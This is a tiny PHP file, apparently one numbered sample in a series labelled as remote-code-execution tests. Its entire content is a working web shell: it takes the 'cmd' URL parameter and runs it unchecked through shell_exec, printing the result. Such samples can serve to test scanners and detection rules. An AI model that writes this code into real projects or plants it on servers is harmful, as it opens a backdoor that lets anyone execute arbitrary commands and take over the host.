<?php
// RCE test variation #681
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>